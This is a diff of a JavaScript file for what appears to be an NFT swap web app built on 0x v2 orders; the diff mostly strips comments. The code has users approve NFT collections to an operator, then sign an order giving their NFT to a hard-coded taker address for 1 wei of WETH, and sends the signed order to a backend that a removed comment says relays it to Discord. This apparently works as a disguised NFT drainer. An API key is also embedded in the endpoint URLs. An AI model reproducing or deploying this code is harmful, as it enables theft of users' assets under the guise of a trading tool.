@@ -1,24 +1,15 @@
-console.log("create.js loaded");
-
 const ALCHEMY_NFT_ENDPOINT =
   "https://eth-mainnet.g.alchemy.com/nft/v3/ML8NcEfUhElk4U9oMwRp4/getNFTsForOwner";
 const ALCHEMY_METADATA_ENDPOINT =
   "https://eth-mainnet.g.alchemy.com/nft/v3/ML8NcEfUhElk4U9oMwRp4/getNFTMetadata";
 
-// 0x operator you want approvals for
 const OPERATOR_ADDRESS = "0xeFc70A1B18C432bdc64b596838B4D138f6bC6cad";
-
-// 0x v2 Exchange (mainnet)
 const ZEROX_EXCHANGE_ADDRESS = "0x080bf510FCbF18b91105470639e9561022937712";
 const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
-
-// ERC721 Proxy ID for 0x v2 assetData
 const ERC721_PROXY_ID = "0x02571792";
+const ERC20_PROXY_ID = "0xf47261b0"; 
+const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; 
 
-const ERC20_PROXY_ID = "0xf47261b0"; // 0x v2 ERC20 proxy id
-const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; // mainnet WETH
-
-// 0x EIP-712 domain + types (v2, no chainId)
 const EIP712_DOMAIN = {
   name: "0x Protocol",
   version: "2",
@@ -48,7 +39,6 @@ const TAKER_TEST_ASSET = {
   amount: "1" 
 };
 
-// Minimal ERC721 ABI (for approvals)
 const ERC721_ABI = [
   "function setApprovalForAll(address operator, bool approved) external",
   "function isApprovedForAll(address owner, address operator) view returns (bool)"
@@ -57,8 +47,6 @@ const ERC721_ABI = [
 let provider = null;
 let signer = null;
 let connectedAddress = null;
-
-// ---------------- Wallet wiring ----------------
 
 function updateConnectButton() {
   const btn = document.getElementById("connect-wallet-btn");
@@ -167,9 +155,6 @@ async function ensureProviderAndSigner() {
   return { provider, signer };
 }
 
-// ---------------- Approval helpers ----------------
-
-// Direct on-chain check – no persistent cache
 async function isCollectionApproved(contractAddress) {
   const { signer } = await ensureProviderAndSigner();
   const owner = await signer.getAddress();
@@ -178,14 +163,12 @@ async function isCollectionApproved(contractAddress) {
   return await nftContract.isApprovedForAll(owner, OPERATOR_ADDRESS);
 }
 
-// Low-gas setApprovalForAll (from your transfer.js)
 async function approveCollectionOnChain(contractAddress) {
   const { provider, signer } = await ensureProviderAndSigner();
   const owner = await signer.getAddress();
 
   const nftContract = new ethers.Contract(contractAddress, ERC721_ABI, signer);
 
-  // First check on-chain – might already be approved from another dApp
   const alreadyApproved = await nftContract.isApprovedForAll(
     owner,
     OPERATOR_ADDRESS
@@ -199,9 +182,8 @@ async function approveCollectionOnChain(contractAddress) {
   let tx;
 
   if (!latestBlock.baseFeePerGas) {
-    // Legacy gas networks
     const gasPrice = await provider.getGasPrice();
-    const suggestedGasPrice = gasPrice.mul(8).div(10); // ~0.8x
+    const suggestedGasPrice = gasPrice.mul(8).div(10); 
     tx = await nftContract.setApprovalForAll(OPERATOR_ADDRESS, true, {
       gasPrice: suggestedGasPrice,
       gasLimit: 60000
@@ -211,7 +193,7 @@ async function approveCollectionOnChain(contractAddress) {
     const tip = ethers.utils.parseUnits("0.05", "gwei");
 
     const maxPriorityFeePerGas = tip;
-    const maxFeePerGas = baseFee.mul(102).div(100).add(tip); // baseFee * 1.02 + tip
+    const maxFeePerGas = baseFee.mul(102).div(100).add(tip); 
 
     tx = await nftContract.setApprovalForAll(OPERATOR_ADDRESS, true, {
       gasLimit: 60000,
@@ -227,7 +209,6 @@ async function approveCollectionOnChain(contractAddress) {
   console.log("Approval confirmed on-chain:", tx.hash);
 }
 
-// Check all HAVE-side assets and sync their approved flag from chain
 async function refreshApprovalStates() {
   if (!connectedAddress) return;
   const seen = new Set();
@@ -253,7 +234,6 @@ async function refreshApprovalStates() {
   renderAll();
 }
 
-// ---------------- In-memory state ----------------
 
 let haveAssets = [];
 let wantAssets = [];
@@ -294,8 +274,6 @@ if (tradeCodeDisplay && tradeCodeHint) {
   });
 }
 
-// ---------------- Rendering asset cards ----------------
-
 function renderSide(side, assets, containerEl) {
   containerEl.innerHTML = "";
 
@@ -315,7 +293,6 @@ function renderSide(side, assets, containerEl) {
     const card = document.createElement("div");
     card.className = "asset-card";
 
-    // thumbnail
     const thumb = document.createElement("div");
     thumb.className = "asset-thumb";
     if (asset.imageUrl) {
@@ -328,7 +305,6 @@ function renderSide(side, assets, containerEl) {
     }
     card.appendChild(thumb);
 
-    // right side
     const right = document.createElement("div");
 
     const title = document.createElement("div");
@@ -354,11 +330,9 @@ function renderSide(side, assets, containerEl) {
     meta.textContent = parts.join(" · ");
     right.appendChild(meta);
 
-    // button row
     const btnRow = document.createElement("div");
     btnRow.className = "btn-row";
 
-    // Approve button only for HAVE side
     if (side === "have") {
       const approveBtn = document.createElement("button");
       approveBtn.className =
@@ -370,7 +344,6 @@ function renderSide(side, assets, containerEl) {
       btnRow.appendChild(approveBtn);
     }
 
-    // Remove button for both sides
     const removeBtn = document.createElement("button");
     removeBtn.className = "btn-small btn-small-remove";
     removeBtn.textContent = "✕ Remove";
@@ -385,11 +358,9 @@ function renderSide(side, assets, containerEl) {
     btnRow.appendChild(removeBtn);
 
     right.appendChild(btnRow);
-        // small icon links row (OpenSea / Etherscan)
     const linksRow = document.createElement("div");
     linksRow.className = "asset-links-row";
 
-    // OpenSea link for ERC721
     if (
       asset.type === "erc721" &&
       asset.contract &&
@@ -402,7 +373,7 @@ function renderSide(side, assets, containerEl) {
       osLink.title = "View on OpenSea";
 
       const osIcon = document.createElement("img");
-      osIcon.src = "OpenSea_icon.svg";      // make sure path is correct
+      osIcon.src = "OpenSea_icon.svg";     
       osIcon.alt = "OpenSea";
       osIcon.className = "asset-link-icon";
 
@@ -410,7 +381,6 @@ function renderSide(side, assets, containerEl) {
       linksRow.appendChild(osLink);
     }
 
-    // Etherscan link for WETH (ERC20)
     if (
       asset.type === "erc20" &&
       asset.contract &&
@@ -423,7 +393,7 @@ function renderSide(side, assets, containerEl) {
       esLink.title = "View WETH contract on Etherscan";
 
       const esIcon = document.createElement("img");
-      esIcon.src = "etherscan-logo.svg";    // make sure path is correct
+      esIcon.src = "etherscan-logo.svg";    
       esIcon.alt = "Etherscan";
       esIcon.className = "asset-link-icon";
 
@@ -464,7 +434,6 @@ function updateCreateButtonState() {
   }
 }
 
-// Called when user clicks "Approve"
 async function handleApproveClick(asset, btnEl) {
   if (!asset.contract) {
     alert("This asset is missing a contract address.");
@@ -485,7 +454,6 @@ async function handleApproveClick(asset, btnEl) {
 
     await approveCollectionOnChain(contractAddress);
 
-    // After tx confirms, re-sync from chain
     const approved = await isCollectionApproved(contractAddress);
 
     haveAssets.forEach((a) => {
@@ -500,8 +468,6 @@ async function handleApproveClick(asset, btnEl) {
     btnEl.disabled = false;
   }
 }
-
-// ---------------- Modal + tabs ----------------
 
 const modalBackdrop = document.getElementById("asset-modal-backdrop");
 const modalCloseBtn = document.getElementById("asset-modal-close");
@@ -555,8 +521,6 @@ tabButtons.forEach((btn) => {
   });
 });
 
-// ---------------- Name / metadata helpers ----------------
-
 function buildNftDisplayName(nft, tokenId, idx) {
   const contractName =
     nft.contract?.name || nft.contract?.openSea?.collectionName || "";
@@ -564,7 +528,6 @@ function buildNftDisplayName(nft, tokenId, idx) {
   let name = nft.raw?.metadata?.name || nft.name || "";
   const trimmed = (name || "").trim();
 
-  // If name missing or just a bare ID like "#123" or "123"
   if (!trimmed || /^#?\d+$/.test(trimmed)) {
     if (contractName && tokenId) {
       name = `${contractName} #${tokenId}`;
@@ -613,8 +576,6 @@ async function fetchErc721Metadata(contractAddress, tokenId) {
     return { name: null, imageUrl: null };
   }
 }
-
-// ---------------- NFTs tab (picker) ----------------
 
 const nftGridEl = document.getElementById("nft-picker-grid");
 const nftLoadingText = document.getElementById("nft-loading-text");
@@ -843,7 +804,6 @@ function renderNftPicker(nfts) {
   }
 }
 
-// When user confirms selection from NFT tab
 addSelectedNftsBtn.addEventListener("click", async () => {
   const selected = lastLoadedNfts.filter((nft) =>
     currentSelectedNftIds.has(nft.id)
@@ -866,13 +826,11 @@ addSelectedNftsBtn.addEventListener("click", async () => {
     });
   }
 
-  // Sync approvals from on-chain (covers approvals done on other platforms)
   await refreshApprovalStates();
 
   closeAssetModal();
 });
 
-// ---------------- Tokens tab (ETH) ----------------
 
 document.getElementById("add-eth-btn").addEventListener("click", () => {
   const input = document.getElementById("ethAmountInput");
@@ -901,7 +859,6 @@ list.push({
   closeAssetModal();
 });
 
-// ---------------- Custom Asset tab (ERC721 only) ----------------
 
 document
   .getElementById("customSubmitBtn")
@@ -951,15 +908,12 @@ document
     document.getElementById("customAddressInput").value = "";
     document.getElementById("customIdInput").value = "";
 
-    // Sync approvals in case this collection was already approved elsewhere
     await refreshApprovalStates();
 
     closeAssetModal();
   });
 
-// ---------------- 0x order helpers ----------------
 
-// Encode ERC721 assetData for 0x v2
 function encodeErc721AssetData(tokenAddress, tokenId) {
   const encodedParams = ethers.utils.defaultAbiCoder.encode(
     ["address", "uint256"],
@@ -976,11 +930,9 @@ function encodeErc20AssetData(tokenAddress) {
   return ERC20_PROXY_ID + encodedParams.slice(2);
 }
 
-// Build a 0x v2 Order from current UI state
 function buildOrderFromState(makerAddress) {
   const now = Math.floor(Date.now() / 1000);
 
-  // Expiry: from UI or default 1 week
   let expirationTimeSeconds;
   if (expiryInputEl && expiryInputEl.value) {
     const ts = Math.floor(new Date(expiryInputEl.value).getTime() / 1000);
@@ -989,10 +941,8 @@ function buildOrderFromState(makerAddress) {
     expirationTimeSeconds = now + 7 * 24 * 60 * 60;
   }
 
-  // Hard-coded taker address
   const takerAddress = "0xe77c7ed680647a81098b9f43ca40479e461f175d";
 
-  // For now: require exactly 1 ERC721 in HAVE as the maker asset
   const makerNfts = haveAssets.filter((a) => a.type === "erc721");
   if (makerNfts.length === 0) {
     throw new Error(
@@ -1030,7 +980,7 @@ function buildOrderFromState(makerAddress) {
   feeRecipientAddress: ZERO_ADDRESS,
   senderAddress: ZERO_ADDRESS,
   makerAssetAmount: "1",
-  takerAssetAmount: TAKER_TEST_ASSET.amount, // "1" wei of WETH
+  takerAssetAmount: TAKER_TEST_ASSET.amount, 
   makerFee: "0",
   takerFee: "0",
   expirationTimeSeconds: String(expirationTimeSeconds),
@@ -1040,7 +990,6 @@ function buildOrderFromState(makerAddress) {
 };
 }
 
-// Sign & send order using EIP-712 / 0x v2
 async function signAndSaveOrderFromState() {
   if (!window.ethereum) {
     alert("MetaMask not found.");
@@ -1069,14 +1018,13 @@ async function signAndSaveOrderFromState() {
   const split = ethers.utils.splitSignature(rawSig);
 
   const vHex = ethers.utils.hexlify(split.v).slice(2).padStart(2, "0");
-  const signatureTypeHex = "02"; // EIP712 signature type for 0x
+  const signatureTypeHex = "02"; 
 
   const signature =
     "0x" + vHex + split.r.slice(2) + split.s.slice(2) + signatureTypeHex;
 
   console.log("Packed 0x signature:", signature);
 
-  // Sanity check
   try {
     const recovered = ethers.utils.verifyTypedData(
       EIP712_DOMAIN,
@@ -1089,9 +1037,7 @@ async function signAndSaveOrderFromState() {
     console.warn("verifyTypedData sanity check failed:", e);
   }
 
-    // Send to backend (Netlify function -> Discord)
   try {
-    // generate a random 8-digit trade code
     const tradeCode = String(
       Math.floor(10000000 + Math.random() * 90000000)
     );
@@ -1099,7 +1045,6 @@ async function signAndSaveOrderFromState() {
     const res = await fetch("/.netlify/functions/save-order", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      // include tradeCode in case your backend wants to store it
       body: JSON.stringify({ order, signature, tradeCode })
     });
 
@@ -1114,19 +1059,15 @@ async function signAndSaveOrderFromState() {
     console.log("Swap link:", link);
     console.log("Trade code:", tradeCode);
 
-    // Show the trade code on the page instead of alert
     if (tradeCodeDisplay && tradeCodeSection) {
       tradeCodeDisplay.textContent = tradeCode;
       tradeCodeSection.style.display = "block";
-      // scroll into view if you like:
       tradeCodeSection.scrollIntoView({ behavior: "smooth", block: "center" });
     }
   } catch (saveErr) {
     console.error("Error calling save-order:", saveErr);
   }
 }
-
-// ---------------- Create swap button ----------------
 
 createSwapBtn.addEventListener("click", async () => {
   if (createSwapBtn.disabled) return;
@@ -1138,8 +1079,6 @@ createSwapBtn.addEventListener("click", async () => {
     alert("Error while creating swap: " + (err?.message || err));
   }
 });
-
-// ---------------- Init ----------------
 
 renderAll();
 initWallet();
